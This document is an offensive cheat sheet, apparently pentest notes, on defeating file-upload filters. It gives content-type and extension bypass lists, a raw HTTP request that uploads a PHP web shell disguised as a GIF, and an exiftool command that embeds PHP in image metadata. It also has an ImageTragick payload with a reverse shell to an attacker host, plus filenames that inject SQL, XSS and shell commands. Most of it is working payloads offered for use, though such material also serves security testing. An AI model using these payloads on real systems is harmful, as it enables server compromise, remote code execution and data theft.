# File Upload

## Bypass File Upload

1.Bypass content-type check
```
Content-Type: application/x-php
Content-Type: application/octet-stream
Content-Type: text/plain
Content-Type: image/png
Content-Type: image/jpeg
```

2.Bypass file extension check
  - Using some uppercase letter: **pHp, pHP5, PhAr**
  - If the extension is validated, change it when send the request in burp
    ```
    filename="dapos.php.jpg" Change to => filename="dapos.php"
    ```
      or
    ```
    filename="dapos.jpg" Change to => filename="dapos.jpg.php"
    ```
  - Try adding special characters at the end, you could use burp intruder to bruteforce all the ASCII and Unicode character
    - file.php%20
    - file.php%0a
    - file.php%00
    - file.php%0d%0a
    - file.php/
    - file.php.\
    - file.
    - file.php....
    - file.pHp5....
  - Try to bypass the protections tricking the extension parser ot the server-side by doubling the extension or adding junk data (null bytes) between extension
    - file.png.php
    - file.png.pHp5
    - file.php%00.png
    - file.php\x00.png
    - file.php%0a.png
    - file.php%0d%0a.png
    - file.phpJunk123png
    - file.php\x00.jpg
    - This technique can be used in tricky situations where the standard null byte injection won't work. This can also be accomplished with Burp and modifying the hex request. Name the file shell.phpD.jpg — we'll replace the D character with a null character during the request. When uploading the file, intercept the request, go to the hex tab, and find the hex representation of the D character, Simply replace the 44 with 00 and send the request through
  - Add another layer of extensions
    - file.png.jpg.php
    - file.php%00.png%00.jpg
  - Using NTFS alternate data stream (ADS) in Windows. In this case, a colon character “:” will be inserted after a forbidden extension and before a permitted one. As a result, an empty file with the forbidden extension will be created on the server (e.g. “file.asax:.jpg”). This file might be edited later using other techniques such as using its short filename. The “::$data” pattern can also be used to create non-empty files. Therefore, adding a dot character after this pattern might also be useful to bypass further restrictions (.e.g. “file.asp::$data.”)
3.Bypass with file type headers. Usually, if an upload function accepts images, it will accept GIF files as well. We can add GIF89a; to the beginning of the shell to trick the upload
```
POST /images/upload/ HTTP/1.1
Host: target.com
[...]

---------------------------829348923824
Content-Disposition: form-data; name="uploaded"; filename="dapos.php"
Content-Type: image/gif

GIF89a; <?php system($_GET['cmd']); ?>
```
And dont forget to change the content-type to image/gif

## Other Tricks

1. Rename the uploaded file (to change extension or another vulnerability\
2. Upload an executable (.exe) or an .html (less suspicious) that will execute code when accidentally opened by victim
3. Possible Information disclosure
   - Upload several times (and at the same time) the same file with the same name
   - Upload a file with the name of a file or folder that already exists
   - Uploading a file with “.”, “..”, or “…” as its name. For instance, in Apache in Windows, if the application saves the uploaded files in “/www/uploads/” directory, the “.” filename will create a file called “uploads” in the “/www/” directory.
   - Upload a file that may not be deleted easily such as “…:.jpg” in NTFS. (Windows)
   - Upload a file in Windows with invalid characters such as |<>*?” in its name. (Windows)
   - Upload a file in Windows using reserved (forbidden) names such as CON, PRN, AUX, NUL, COM1, COM2, COM3, COM4, COM5, COM6, COM7, COM8, COM9, LPT1, LPT2, LPT3, LPT4, LPT5, LPT6, LPT7, LPT8, and LPT9.
4. If the uploaded file in PHP server use **.htaccess** trick to execute the code
   - [Tools for .htaccess shell attack](https://github.com/wireghoul/htshells)
5. If the uploaded file in ASP server use **.config** trick to execute the code
   - [poc](https://gist.github.com/gazcbm/ea7206fbbad83f62080e0bbbeda77d9c)
   - [poc2](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Configuration%20IIS%20web.config/web.config)
6. In some occasions you may find that a server is using wget to download files and you can indicate the URL. In these cases, the code may be checking that the   extension of the downloaded files is inside a whitelist to assure that only allowed files are going to be downloaded. However, this check can be bypassed. The maximum length of a filename in linux is 255, however, wget truncate the filenames to 236 characters. You can download a file called "A"*232+".php"+".gif", this filename will bypass the check (as in this example ".gif" is a valid extension) but wget will rename the file to "A"*232+".php".Note that another option you may be thinking of to bypass this check is to make the HTTP server redirect to a different file, so the initial URL will bypass the   check by then wget will download the redirected file with the new name. This won't work unless wget is being used with the parameter --trust-server-names because wget will download the redirected page with the name of the file indicated in the original URL
  ```
  #Create file and HTTP server
  echo "SOMETHING" > $(python -c 'print("A"*(236-4)+".php"+".gif")')
  python3 -m http.server 9080
  ```
  ```
  #Download the file
  wget 127.0.0.1:9080/$(python -c 'print("A"*(236-4)+".php"+".gif")')
  The name is too long, 240 chars total.
  Trying to shorten...
  New name is   AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.
   --2020-06-13 03:14:06--  http://127.0.0.1:9080/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.gif
  Connecting to 127.0.0.1:9080... connected.
  HTTP request sent, awaiting response... 200 OK
  Length: 10 [image/gif]
  Saving to:  ‘AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php’

  AAAAAAAAAAAAAAAAAAAAAAAAAAAAA 100%[===============================================>]      10  --.-KB/s    in 0s      

  2020-06-13 03:14:06 (1.96 MB/s) - ‘AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php’ saved [10/10]
  ```
7. Set filename to ../../../tmp/lol.png and try to achieve a path traversal
8. Set filename to sleep(10)-- -.jpg and you may be able to achieve a SQL injection
9. Set filename to <svg onload=alert(document.comain)> to achieve a XSS
10. Set filename to ; sleep 10; to test some command injection
11. ImageTragic
    - Upload this content with an image extension to exploit the vulnerability (ImageMagick , 7.0.1-1)
         ```
         push graphic-context
      viewbox 0 0 640 480
      fill 'url(https://127.0.0.1/test.jpg"|bash -i >& /dev/tcp/attacker-ip/attacker-port 0>&1|touch "hello)'
      pop graphic-context
        ```
  
## What can achive by uploading
  
1. **ASP / ASPX / PHP5 / PHP / PHP3**: Webshell / RCE
2. **SVG**: Stored XSS / SSRF / XXE
3. **GIF**: Stored XSS / SSRF
4. **CSV**: CSV injection
5. **XML**: XXE
6. **AVI**: LFI / SSRF
7. **HTML / JS**: HTML injection / XSS / Open redirect
8. **PNG / JPEG**: Pixel flood attack (DoS)
9. **ZIP**: RCE via LFI / DoS
10. **PDF / PPTX**: SSRF / BLIND XXE
  
## Usefull extension
  
- **PHP**: .php, .php2, .php3, .php4, .php5, .php6, .php7, .phps, .phps, .pht, .phtm, .phtml, .pgif, .shtml, .htaccess, .phar, .inc
- **ASP**: .asp, .aspx, .config, .ashx, .asmx, .aspq, .axd, .cshtm, .cshtml, .rem, .soap, .vbhtm, .vbhtml, .asa, .cer, .shtml
- **Jsp**: .jsp, .jspx, .jsw, .jsv, .jspf, .wss, .do, .action
- **Coldfusion**: .cfm, .cfml, .cfc, .dbm
- **Flash**: .swf
- **Perl**: .pl, .cgi
- **Erlang** Yaws Web Server: .yaws
  
## Exif data
  We can insert a comment that contains PHP code that will be executed by server when the image is processed
  ```
  exiftool -Comment="<?php system($_GET['cmd']); ?>" pic.jpg
  ```
  
## Reference
  
- https://book.hacktricks.xyz/pentesting-web/file-upload#wget-file-upload-ssrf-trick
